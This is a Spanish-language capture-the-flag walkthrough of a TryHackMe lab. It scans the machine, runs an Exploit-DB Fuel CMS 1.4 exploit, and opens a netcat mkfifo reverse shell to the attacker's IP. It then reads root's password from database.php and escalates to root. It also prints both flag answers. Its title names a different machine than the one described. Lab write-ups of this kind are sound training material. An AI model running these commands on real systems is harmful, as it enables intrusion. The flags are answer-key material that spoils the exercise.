# Máquina Tom Ghost

Dificultad --> Medio-Dificil 

Instrucciones --> **Para poder resolver esta máquina tienes que registrarte en la página de TryHackMe y buscarla por el nombre de Tom Ghost**


'

-------------------------------------------------------------------------------------------------------------------------------------------------------------------

'

![image](https://github.com/user-attachments/assets/081f2f9e-45ca-4253-8d19-74e8de00e419)


## 1.Reconocmiento

Escaneando puertos y sus versiones utilizando el comando de nmap con diferentes parámetros


![image](https://github.com/user-attachments/assets/c724e1c0-bc4e-4d8e-94b8-73d42dc71cf5)


nmap -sV -sC -T4 10.10.129.220


![image](https://github.com/user-attachments/assets/91a34ad4-87a1-4b51-bb30-dc56b2223575)


![image](https://github.com/user-attachments/assets/c8c1c7b0-af8f-4342-a9d1-26461ad482c2)



### Resumen de la Información Obtenida

|IP               | Sistema OPerativo | Puertos/Servicios           | 
|:--------------: |:-----------------:| :--------------------------:| 
| 10.10.129.220   |Linux- Ubuntu      | 80 http Apache httpd 2.4.18 |


## 2. Análisis de Vulnerabilidades / Debilidades 🔍

Buscamos en nuestra máquina si tenemos un exploit para fuel cms version 1.4


![image](https://github.com/user-attachments/assets/6c14076d-899a-43e8-866b-b77691c223ef)

Buscamos la ruta completa del exploit

    /usr/share/exploitdb/exploits/php/webapps/50477.py

![image](https://github.com/user-attachments/assets/5a09abd7-11cc-4330-aef4-833e38bfe4f2)


Copiamos el exploit en nuestra carpeta de trabajo y lo nombramos fuelcmsexploit.py


![image](https://github.com/user-attachments/assets/03c96bdb-d8a6-42d2-bdc7-acc1e61e210d)


## 3. Explotación 💥

Lo ejecutamos para que nos indique la sintaxis correcta de usarlo


![image](https://github.com/user-attachments/assets/94f652b9-5a4e-4524-ab61-41f5f22e4452)

lo ejecutamos y logramos conectarnos

    python fuelcmsexploit.py -u http://10.10.129.220/


![image](https://github.com/user-attachments/assets/ad271747-8c7e-425b-9f8f-0003976e7370)


Ahora vamos a buscar la manera de conectarnos a través de una reverse shell

![image](https://github.com/user-attachments/assets/b8bc7562-6e15-4f23-8276-5e4f8a628246)


Activamos el netcat en nuestra máquina y procedemos a ejecutar el siguiente comando en la máquina victima

    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.86.141 9001 >/tmp/f


![image](https://github.com/user-attachments/assets/bd030730-03df-40b0-b117-c498b89a8ea7)


Ahora ejecutamos el siguiente comando para tener una shell mas interactiva 

    python -c 'import pty; pty.spawn("/bin/bash")’

Nos vamos al directorio del usuario www-data y ahí encontraremos la bandera flag.txt 🚩

6470e394cbf6dab6a91682cc8585059b

![image](https://github.com/user-attachments/assets/aa63e3ec-a1b4-4b97-9e9a-7d215b65f5d5)


## 4. Escalación de privilegios 🧗

Ahora vamos a buscar escalar privilegios, cuando exploramos la pagina conseguimos la ruta de un archivo para la configuración de una base de datos


![image](https://github.com/user-attachments/assets/27b2748a-2bb5-4483-8fc4-9abcb5887931)


Nos iremos moviendo dentro de diferentes directorios hasta llegar donde se encuentra el archivo database.php

![image](https://github.com/user-attachments/assets/9edd09c2-fbd6-4239-afaa-ffa84fffc769)


Ejecutamos el siguiente comando y encontraremos la contraseña del usuario root

    cat database.php

![image](https://github.com/user-attachments/assets/615c8834-be84-45f2-8055-b8c4aa0e3468)


Procedemos a escalar privilegios como usuario root

![image](https://github.com/user-attachments/assets/42696599-144b-4927-b112-6d6ec8fbfb40)


Nos dirigimos a la carpeta root en búsqueda de la segunda bandera

b9bbcb33e11b80be759c4e844862482d


![image](https://github.com/user-attachments/assets/e4b3133b-2a44-406f-ae7e-3e0ff1838575)


## 5.Banderas 🏁

|user.txt | 6470e394cbf6dab6a91682cc8585059b |
|:-------:|:--------------------------------:|
|root.txt | b9bbcb33e11b80be759c4e844862482d |



## 6.Extra 🚨

Acá las respuesta del cuestionario de TryHackMe 

- user.txt

6470e394cbf6dab6a91682cc8585059b

- root.txt

b9bbcb33e11b80be759c4e844862482d


































































































































